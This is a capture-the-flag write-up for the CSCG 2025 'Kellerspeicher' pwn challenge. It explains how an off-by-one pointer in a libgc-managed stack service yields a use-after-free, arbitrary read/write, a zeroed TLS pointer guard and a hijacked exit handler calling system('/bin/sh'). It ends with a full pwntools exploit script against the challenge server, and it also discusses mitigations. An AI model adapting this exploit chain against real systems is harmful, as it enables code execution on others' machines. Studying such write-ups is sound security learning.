# CSCG 2025 - Kellerspeicher
## Challenge Information

Description:
> I build some Kellerspeicher for you. To prevent memory leaks I use a garbage collector. Definitely not because I'm lazy.

- Category: `Pwn`
- Difficulty: `Hard`
- Author: `DIFF-FUSION`

## Challenge Setup

All of the identifiers and strings in the challenge code is written in German. I am going to refer to those operation with their English translation.

The challenge implements a service to manage two stacks, a main (`"haupt"`) and a side (`"neben"`) stack, in C. They can be created, deleted, pushed and popped from and elements can be exchanged between the two. So far, so normal. There is also the option to just once increase the amount of free elements in the main stack without increase the allocated memory. Thus, a one byte overflow is possible.

A stack is represented by the following struct:
```c
struct Stack {
    uint8_t *elements;
    size_t used;
    size_t free;
};
```

Both the stack struct and the elements array in the stack, are allocated on the heap. As was already hinted at in the challenge description, [`libgc`](https://github.com/ivmai/bdwgc) is used as memory allocator.

## libgc - The Boehm-Demers-Weiser conservative C/C++ Garbage Collector

[`libgc`](https://github.com/ivmai/bdwgc) implements automatic Garbage Collection for C and C++ programs. This means there is no longer the need for an explicit call to `free`. The implementation scans the programs memory periodically to find all reachable chunks, i.e. there exists are pointer to it. Those are called `roots`. It searches in the binaries data segments (`.data`, `.bss`), the stack, registers and some minor regions more. From there, found chunks are scanned recursively for pointers and marked as accessible. All unmarked chunks are deallocated. This is also known as mark-and-sweep algorithm and used by many garbage collectors.

Allocation in `libgc` happens page-wise. Smaller allocations than a certain threshold (`512` bytes, on Linux x64) are allocated from a page which has been split into multiple chunks for the same size and therefore only serves this size, until all chunks are being deallocated and the page can be freed. For allocation sizes over the threshold, the size is rounded up to a multiple of the page size. Allocation sizes always are incremented by 1 to enforce that the pointer to the chunk, for example an allocated array, is always pointing into the chunks memory and thus is recognized by the collector as in-use and not accidentally deallocated. 

There is also an optimization for allocations in multithreaded from a thread-local cache, similar to `ptmalloc`'s tcaches, which is not relevant to the solution of challenge.

## Exploit - Overview

By allocating a main stack of size `0x1000`, doing the overflow operation and filling the main stack fully up, the elements pointer will point to the end of the allocated array. This means that when the garbage collector finds the pointer, it counts the pointer as pointing to the next object after the array because that is where the pointer points. Therefore, we allocate objects (i.e side stacks) until the garbage collector runs, which gives us a use-after-free. The exact number of allocations can be determined experimentally. I determined the value to be `1834`, with the allocation sizes that I chose.

To achieve arbitrary read and write, we manage to allocate the side stack into that memory region. From there, we can leak the `elements` pointer by popping bytes and overwrite it by pushing bytes from the main stack. To write to the designated memory location, we can push to the side stack.

To achieve RCE, we first overwrite the pointer guard in the thread-local storage (TLS) with zero, which is at a constant offset from the mmapped GC heap region. Then we overwrite the first exit function with with `fn=system` and `arg="/bin/sh"`. Because we now the pointer guard, we can mangle the function pointer and successfully get a shell by quitting the program.

`CSCG{einkellern_auskellern_umkellern_unterkellern__kellerspeicher_machen_spass}`

## Mitigations
The simple mitigation is to remove the `unterkellern` functionality. As this functionality is likely there to simplify the challenge and simulates an actual bug, we also need to consider, how to avoid the underlying bug. 

One solution would be to always perform a bounds check after modifying a GC allocated pointer. But as this is likely going to be slow, requires extra effort by developer and makes the code harder to read, which in turn allows other bugs to slip through code review, is not a good option. 

As always with code, the best practices regarding
- Clean code,
- Code reviews and
- Fuzzing

can most of those bugs.

An even better option, is to use memory safe languages like Rust.

TL;DR: As always with `C`: Memory safety management.

## Exploit - Script

```python
from pwn import *

# local
# p = remote("localhost", 1024)

# remote
p = remote("ae2e08417837a15ad1c6647c-1024-kellerspeicher.challenge.cscg.live", 1337, ssl=True)

### wrappers ###
def create_haupt(size: int):
    p.sendlineafter(b"Wahl: ", b"1")
    p.sendlineafter("Größe des Kellers:".encode(), str(size).encode())

def create_neben(size: int):
    p.sendlineafter(b"Wahl: ", b"2")
    p.sendlineafter("Größe des Kellers:".encode(), str(size).encode())

def create_neben_str(size: int) -> bytes:
    return b"2\n" + str(size - 1).encode() + b"\n"

def del_haupt():
    p.sendlineafter(b"Wahl: ", b"3")

def del_neben():
    p.sendlineafter(b"Wahl: ", b"4")

def del_neben_str() -> str:
    return b"4\n"

def push_haupt(elem: int):
    assert(elem >= 0 and elem < 256)
    p.sendlineafter(b"Wahl: ", b"5")
    p.sendlineafter(b"Geben sie das element in hexadezimal notation an: ", f"{elem:02x}".encode())

def push_haupt_str(elem: int) -> bytes:
    assert(elem >= 0 and elem < 256)
    return b"5\n" + f"{elem:02x}\n".encode()

def push_neben(elem: int):
    assert(elem >= 0 and elem < 256)
    p.sendlineafter(b"Wahl: ", b"6")
    p.sendlineafter(b"Geben sie das element in hexadezimal notation an: ", f"{elem:02x}".encode())

def pop_haupt() -> int:
    p.sendlineafter(b"Wahl: ", b"7")
    p.recvuntil(b"Element: ")
    return int(p.recvuntil(b"\n"), 16)

def pop_neben() -> int:
    p.sendlineafter(b"Wahl: ", b"8")
    p.recvuntil(b"Element: ")
    return int(p.recvuntil(b"\n"), 16)

def transfer_haupt_neben():
    p.sendlineafter(b"Wahl:", b"9")

def transfer_neben_haupt():
    p.sendlineafter(b"Wahl:", b"10")

def unterkellern():
    p.sendlineafter(b"Wahl:", b"11")

def do_exit():
    p.sendlineafter(b"Wahl:", b"12")

### Wrappers for batch processing to speed up exploit ###
def push_haupt_batch(elem_list):
    buffer = b""
    for elem in elem_list:
        buffer += push_haupt_str(elem)
    p.send(buffer)

def gc_thrashing(num_objects: int, obj_size: int):
    buffer = b""
    for _ in range(num_objects):
        buffer += create_neben_str(obj_size) + del_neben_str()
    p.send(buffer)

# whole page, no alignment issues
haupt_size = 0x1000

# sizeof(Keller)
neben_size = 0x20

# create main stack and overflow the elements pointer
create_haupt(haupt_size - 1)
unterkellern()
push_haupt_batch([0] * haupt_size)

# 1834 was determined empirically
gc_thrashing(1834, neben_size - 1)

# put chunk into hauptkeller->elements
create_neben(neben_size - 1)

for _ in range(0x40 - 8):
    pop_haupt()

# leak GC heap base address
gc_heap_base = sum([(pop_haupt() << (i * 8)) for i in range(7, -1, -1)]) - 0x11fc0
libc_base = gc_heap_base + 0x53000
print(f"gc_heap_base = {gc_heap_base:#x}")
print(f"libc_base = {libc_base:#x}")

def overwrite_neben_elem_ptr(new_addr: int):
    for b in new_addr.to_bytes(8, "little"):
        push_haupt(b)

# overwrite neben->elements with address of pointer guard
pointer_guard_addr = gc_heap_base + 0x50740 + 0x30
print(f"pointer_guard_addr = {pointer_guard_addr:#x}")
overwrite_neben_elem_ptr(pointer_guard_addr)

# zero out pointer guard
for _ in range(8):
    push_neben(0)

# overwrite neben->elements with address of &__exit_funcs[0]->fns[0]
exit_funcs_addr = libc_base + 0x204fd0
for _ in range(8):
    pop_haupt()
overwrite_neben_elem_ptr(exit_funcs_addr)

# overwrite benutzt und frei
for b in flat(
    p64(0),
    p64(0x100),
):
    push_haupt(b)

def rotate_left(num, rotate_by, bit_size=32):
    """ following function is presented by out lord and saviour ChatGPT """
    rotate_by %= bit_size  # Ensure rotation value is within the bit size
    return ((num << rotate_by) | (num >> (bit_size - rotate_by))) & ((1 << bit_size) - 1)

def mangle_ptr(ptr, ptr_guard):
    return rotate_left(ptr ^ ptr_guard, 17, 64)

# overwrite exit function with system("/bin/sh")
system = libc_base + 0x58740
bin_sh = libc_base + 0x1cb42f
exit_fn_payload = flat(
    p64(4),
    p64(mangle_ptr(system, 0)),
    p64(bin_sh),
)
for b in exit_fn_payload:
    push_neben(b)

# trigger RCE
do_exit()

p.sendline(b"cat flag")

p.interactive()
```